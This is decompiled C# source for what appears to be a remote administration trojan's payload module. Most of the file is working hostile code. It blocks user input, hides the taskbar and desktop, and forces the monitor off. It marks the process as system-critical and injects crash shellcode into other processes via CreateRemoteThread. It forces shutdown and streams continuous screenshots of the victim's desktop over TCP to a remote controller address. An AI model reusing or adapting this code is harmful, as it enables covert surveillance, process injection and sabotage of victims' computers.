using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;

namespace Twient
{
	// Token: 0x02000004 RID: 4
	internal class Functions
	{
		// Token: 0x06000021 RID: 33
		[DllImport("advapi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

		// Token: 0x06000025 RID: 37 RVA: 0x000026EC File Offset: 0x000008EC
		public static void Beeper()
		{
			Random random = new Random();
			while (GlobalVars.Beeper)
			{
				int frequency = random.Next(37, 15000);
				int duration = random.Next(50, 1000);
				Console.Beep(frequency, duration);
			}
		}

		// Token: 0x06000026 RID: 38 RVA: 0x0000272C File Offset: 0x0000092C
		public static void Beeper_bomb()
		{
			double num = 1000.0;
			for (int i = 1000; i <= 10000; i += 200)
			{
				num *= 0.8;
				Thread.Sleep((int)Convert.ToInt16(num));
				Console.Beep(i, 100);
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000025F3 File Offset: 0x000007F3
		public static void Blockinput()
		{
			while (GlobalVars.Blockinput)
			{
				BlockInput(true);
			}
		}

		// Token: 0x0600001A RID: 26
		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

		// Token: 0x0600002B RID: 43 RVA: 0x0000280C File Offset: 0x00000A0C
		private static Image CaptureDesktop()
		{
			Rectangle rectangle = default(Rectangle);
			rectangle = Screen.PrimaryScreen.Bounds;
			Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
			Graphics graphics = Graphics.FromImage(bitmap);
			graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
			return bitmap;
		}

		// Token: 0x0600002D RID: 45 RVA: 0x000028DC File Offset: 0x00000ADC
		public static bool Crasher(IntPtr hProcess)
		{
			bool result;
			try
			{
				uint num = 0u;
				IntPtr intPtr = WinAPI.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)Stub.CrashStub.Length, 12288, 64);
				if (WinAPI.WriteProcessMemory(hProcess, intPtr, Stub.CrashStub, Stub.CrashStub.Length, out num))
				{
					result = (WinAPI.CreateRemoteThread(hProcess, 0, 0, intPtr, 0u, 0, 0) != IntPtr.Zero);
				}
				else
				{
					result = false;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600002A RID: 42 RVA: 0x000027C0 File Offset: 0x000009C0
		public static void CrazyMouse(int time)
		{
			Random random = new Random();
			for (int i = 0; i < time * 10; i++)
			{
				int x = random.Next(0, 1000);
				int y = random.Next(0, 1000);
				SetCursorPos(x, y);
				Thread.Sleep(100);
			}
		}

		// Token: 0x06000023 RID: 35
		[DllImport("user32.dll", SetLastError = true)]
		private static extern int ExitWindowsEx(int uFlags, uint dwReason);

		// Token: 0x0600000F RID: 15
		[DllImport("user32.dll")]
		private static extern int FindWindow(string className, string windowText);

		// Token: 0x06000011 RID: 17
		[DllImport("user32.dll")]
		public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

		// Token: 0x06000012 RID: 18
		[DllImport("user32.dll")]
		private static extern int GetDesktopWindow();

		// Token: 0x0600001D RID: 29
		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x06000019 RID: 25 RVA: 0x000025E5 File Offset: 0x000007E5
		public static void HideDesktop()
		{
			ShowWindow(HandleDesktop, 0);
		}

		// Token: 0x06000016 RID: 22 RVA: 0x000025AC File Offset: 0x000007AC
		public static void HideTaskBar()
		{
			ShowWindow(HandleTaskbar, 0);
			ShowWindow(HandleOfStartButton, 0);
		}

		// Token: 0x06000027 RID: 39 RVA: 0x0000277C File Offset: 0x0000097C
		public static void Killprocess(string pName)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName(pName);
				for (int i = 0; i < processesByName.Length; i++)
				{
					Process process = processesByName[i];
					process.Kill();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000022 RID: 34
		[DllImport("advapi32.dll")]
		private static extern int LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

		// Token: 0x0600000E RID: 14 RVA: 0x0000253B File Offset: 0x0000073B
		public static void Monitor_off()
		{
			while (GlobalVars.Monitor)
			{
				SendMessage(65535, 274, 61808, 2);
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002634 File Offset: 0x00000834
		public static void MsgBox(string Text, string Title, MessageBoxIcon Icon, MessageBoxButtons Button)
		{
			MessageBox.Show(Text, Title, Button, Icon, MessageBoxDefaultButton.Button1, (MessageBoxOptions)262144);
		}

		// Token: 0x0600000C RID: 12
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

		// Token: 0x06000020 RID: 32
		[DllImport("advapi32.dll")]
		private static extern int OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);

		// Token: 0x0600002C RID: 44 RVA: 0x00002874 File Offset: 0x00000A74
		
				
		public static void Send()
		{
			try
			{
				TcpClient tcpClient = new TcpClient(GlobalVars.DesktopIP, 7495);
				BinaryFormatter binaryFormatter = new BinaryFormatter();
				using (NetworkStream stream = tcpClient.GetStream())
				{
					while (true)
					{
						binaryFormatter.Serialize(stream, CaptureDesktop());
						Thread.Sleep(1);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600000D RID: 13
		[DllImport("user32.dll")]
		private static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);

		// Token: 0x0600000B RID: 11 RVA: 0x00002524 File Offset: 0x00000724
		public static void SetCritical(int enable)
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref enable, 4);
		}

		// Token: 0x06000029 RID: 41
		[DllImport("User32.Dll")]
		public static extern long SetCursorPos(int x, int y);

		// Token: 0x06000028 RID: 40
		[DllImport("user32.dll")]
		public static extern int SetWindowText(IntPtr hWnd, string text);

		// Token: 0x06000018 RID: 24 RVA: 0x000025D7 File Offset: 0x000007D7
		public static void ShowDesktop()
		{
			ShowWindow(HandleDesktop, 1);
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002592 File Offset: 0x00000792
		public static void ShowTaskBar()
		{
			ShowWindow(HandleTaskbar, 1);
			ShowWindow(HandleOfStartButton, 1);
		}

		// Token: 0x06000010 RID: 16
		[DllImport("user32.dll")]
		private static extern int ShowWindow(int hwnd, int command);

		// Token: 0x0600001E RID: 30
		[DllImport("User32")]
		public static extern int ShowWindow(IntPtr hwnd, int nCmdShow);

		// Token: 0x0600001F RID: 31 RVA: 0x0000267C File Offset: 0x0000087C
		public static void Shutdown(int Flag)
		{
			IntPtr tokenHandle;
			OpenProcessToken(Process.GetCurrentProcess().Handle, 40, out tokenHandle);
			TOKEN_PRIVILEGES tOKEN_PRIVILEGES;
			tOKEN_PRIVILEGES.PrivilegeCount = 1;
			tOKEN_PRIVILEGES.Privileges.Attributes = 2;
			LookupPrivilegeValue("", "SeShutdownPrivilege", out tOKEN_PRIVILEGES.Privileges.pLuid);
			AdjustTokenPrivileges(tokenHandle, false, ref tOKEN_PRIVILEGES, 0u, IntPtr.Zero, IntPtr.Zero);
			ExitWindowsEx(Flag, 0u);
		}

		// Token: 0x06000024 RID: 36
		[DllImport("user32.dll")]
		public static extern int SwapMouseButton(int bSwap);

		// Token: 0x17000003 RID: 3
		protected static int HandleDesktop
		{
			// Token: 0x06000017 RID: 23 RVA: 0x000025C6 File Offset: 0x000007C6
			get
			{
				return FindWindow("Progman", "Program Manager");
			}
		}

		// Token: 0x17000002 RID: 2
		protected static int HandleOfStartButton
		{
			// Token: 0x06000014 RID: 20 RVA: 0x00002570 File Offset: 0x00000770
			get
			{
				int desktopWindow = GetDesktopWindow();
				return FindWindowEx(desktopWindow, 0, "button", 0);
			}
		}

		// Token: 0x17000001 RID: 1
		protected static int HandleTaskbar
		{
			// Token: 0x06000013 RID: 19 RVA: 0x0000255C File Offset: 0x0000075C
			get
			{
				return FindWindow("Shell_TrayWnd", "");
			}
		}

		// Token: 0x04000005 RID: 5
		private const int SW_HIDE = 0;

		// Token: 0x04000006 RID: 6
		private const int SW_SHOW = 1;

		// Token: 0x02000005 RID: 5
		private struct LUID
		{
			// Token: 0x04000007 RID: 7
			public int LowPart;

			// Token: 0x04000008 RID: 8
			public int HighPart;
		}

		// Token: 0x02000006 RID: 6
		private struct LUID_AND_ATTRIBUTES
		{
			// Token: 0x04000009 RID: 9
			public LUID pLuid;

			// Token: 0x0400000A RID: 10
			public int Attributes;
		}

		// Token: 0x02000008 RID: 8
		private class Stub
		{
			// Token: 0x0400000D RID: 13
			public static byte[] CrashStub = new byte[]
			{
				161,
				252,
				255,
				255,
				255,
				153,
				247,
				61,
				252,
				255,
				255,
				255,
				163,
				248,
				255,
				255,
				255,
				161,
				248,
				255,
				255,
				255
			};
		}

		// Token: 0x02000007 RID: 7
		private struct TOKEN_PRIVILEGES
		{
			// Token: 0x0400000B RID: 11
			public int PrivilegeCount;

			// Token: 0x0400000C RID: 12
			public LUID_AND_ATTRIBUTES Privileges;
		}

		// Token: 0x02000009 RID: 9
		private class WinAPI
		{
			// Token: 0x06000033 RID: 51
			[DllImport("kernel32.dll", SetLastError = true)]
			public static extern IntPtr CreateRemoteThread(IntPtr hProcess, int lpThreadAttributes, int dwStackSize, IntPtr lpStartAddress, uint lpParameter, int dwCreationFlags, int lpThreadId);

			// Token: 0x06000031 RID: 49
			[DllImport("kernel32.dll", SetLastError = true)]
			public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int flAllocationType, int flProtect);

			// Token: 0x06000032 RID: 50
			[DllImport("kernel32.dll", SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpAddress, byte[] lpBuffer, int dwSize, out uint lpNumberOfBytesRead);
		}
	}
}
